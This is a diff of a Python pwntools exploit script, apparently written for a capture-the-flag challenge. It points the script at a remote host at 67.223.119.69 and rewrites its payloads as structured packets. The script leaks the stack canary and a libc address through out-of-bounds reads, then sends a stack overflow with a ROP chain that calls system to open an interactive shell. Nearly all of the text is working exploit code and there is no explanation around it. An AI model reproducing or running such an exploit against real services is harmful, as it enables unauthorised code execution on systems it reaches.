@@ -35,65 +35,64 @@ def GDB():
 
 #  nc 67.223.119.69 3637 
 if args.REMOTE:
-    # p = remote('67.223.119.69', 3637)
-    p = remote('0', 1338)
+    p = remote('67.223.119.69', 3637)
+    # p = remote('0', 1338)
 else:
     p = process([exe.path])
-
-# control size of 0xdead option
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0x29,
-    p8(0x2),
-    p32(0x10),
-    b'\0'*(0x10),
-)
-sa(b'> ', load)
-input()
-
-# control IDX_3
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0xfffff,
-    p8(0x2),
-    p32(0x2fe0),
-    b'w'*(0x2fe0),
-)
-
-sa(b'> ', load)
-input('2')
-
-# admin_str: 0x7fffffffab70
-# rip 0x7fffffffdb88
+NUMBER = 0
+KEY    = 1
+BIN    = 2
+SIGNAL = 3
+GDB()
 """
-canary: 0x7fffffffdb78
+canary: 0x3009
 """
-# 0x49
+load  = [
+{
+    'type': NUMBER,
+    'value': 0x29
+},
+{
+    'type':  BIN,
+    'data': b'\0'*0x36
+}
+]
+packet = create_packet(0x1337, pack_data(load))
+
+sa(b'> ', packet)
+
+load  = [
+{
+    'type': NUMBER,
+    'value': 0xffff
+},
+{
+    'type': BIN,
+    'data': b'w'*(0x2fe0)
+    # 'data': b'w'*(0x7ff)
+
+}
+]
+packet = create_packet(0x1337, pack_data(load))
+sa(b'> ', packet)
+# input("next?")
+
+load  = [
+{
+    'type': BIN,
+    'data': b'f'*0x29
+}
+]
+packet = create_packet(0xdead, pack_data(load))
+
+sa(b'> ', packet)
 
 
+packet = create_packet(0x700, p8(0))
 
-load = flat(
-    p32(0xdead), # choice in main
-    # arr[0]
-    p8(2),
-    p32(0x60),
-    b'f'*0x60
-)
-sa(b'> ', load)
-input("next")
+sa(b'> ', packet)
 
-load = flat(
-    p32(0x700), # choice in main
-)
 info(f'start leak canary')
-sa(b'> ', load)
-input("cabnary")
-
-
 
 a = p.recvuntil(b'No data available !', drop=True)
 info(f'---------------------------------------------------------')
@@ -101,53 +100,51 @@ print(a)
 canary = u64(a[len(a)-10:len(a)-3] + b'\0') << 8
 info(f'canary: {hex(canary)}')
 
-######################## part 2 ###############################################
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0x38,
-    p8(0x2),
-    p32(0x36),
-    b'\0'*(0x36),
-)
-sa(b'> ', load)
-input("set up")
+load  = [
+{
+    'type': NUMBER,
+    'value': 0x38
+},
+{
+    'type': BIN,
+    'data': b'\0'*(0x36)
+
+}
+]
+packet = create_packet(0x1337, pack_data(load))
 
 
+sa(b'> ', packet)
 
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0xfffff,
-    p8(0x2),
-    p32(0x2fe0),
-    b'w'*(0x2fe0),
-)
+load  = [
+{
+    'type': NUMBER,
+    'value': 0xfffff
+},
+{
+    'type': BIN,
+    'data': b'w'*(0x2fe0)
 
-sa(b'> ', load)
-input("3")
+}
+]
+packet = create_packet(0x1337, pack_data(load))
 
+sa(b'> ', packet)
 
-# leak libc
-load = flat(
-    p32(0xdead), # choice in main
-    # arr[0]
-    p8(2),
-    p32(0x60),
-    b'f'*0x60
-)
-sa(b'> ', load)
-input("?")
+load  = [
+{
+    'type': BIN,
+    'data': b'f'*0x38
+}
+]
+packet = create_packet(0xdead, pack_data(load))
 
+sa(b'> ', packet)
 
-load = flat(
-    p32(0x700), # choice in main
-)
+packet = create_packet(0x700, b'\0')
 
-sa(b'> ', load)
-input("libc")
+sa(b'> ', packet)
+
 info(f'-'*0x10)
 info(f'leak libc')
 a = p.recvuntil(b'No data available !', drop=True)
@@ -157,50 +154,41 @@ libc_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
 libc.address = libc_leak - 0x29d90
 info(f'libc leak: {hex(libc_leak)}')
 info(f'libc base: {hex(libc.address)}')
-GDB()
 
-## control size again to win
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0x100,
-    p8(0x2),
-    p32(0x2fe0),
-    b'\0'*(0x2fe0),
-)
-sa(b'> ', load)
-input("win?")
+load  = [
+{
+    'type': NUMBER,
+    'value': 0x100
+},
+{
+    'type': BIN,
+    'data': b'\0'
 
-
-# control IDX_3
-load = flat(
-    p32(0x1337), # choice in main
-    # arr[0]
-    p8(0x0),
-    0xfffff,
-    p8(0x2),
-    p32(0x2fe0),
-    b'h'*(0x2fe0),
-)
-
-sa(b'> ', load)
+}
+]
+packet = create_packet(0x1337, pack_data(load))
 
 
+sa(b'> ', packet)
 
-# admin_str: 0x7fffffffab70
-# rip 0x7fffffffdb88
-"""
-canary: 0x7fffffffdb78
-"""
-# 0x49
-"""
-canary: 0x28
-libc: 0x38
-"""
+load  = [
+{
+    'type': NUMBER,
+    'value': 0xfffff
+},
+{
+    'type': BIN,
+    'data': b'h'*(0x2fe0)
+
+}
+]
+packet = create_packet(0x1337, pack_data(load))
+
+sa(b'> ', packet)
+
 pop_rdi  =0x000000000002a3e5 + libc.address
-
 win = flat(
+    b'a'*0x28,
     canary,
     1,
     pop_rdi+1,
@@ -209,18 +197,15 @@ win = flat(
     libc.sym.system
 )
 
-load = flat(
-    p32(0xdead), # choice in main
-    # arr[0]
-    p8(2),
-    p32(0x100),
-    b'a'*0x28,
-    win.ljust(0x100-0x28, b'k')
-)
-sa(b'> ', load)
+load  = [
+{
+    'type': BIN,
+    'data': win.ljust(0x100, b'k')
+}
+]
+packet = create_packet(0xdead, pack_data(load))
 
-
-sa(b'> ', b'1')
+sa(b'> ', packet)
 
 # 0x9da5
 p.interactive()
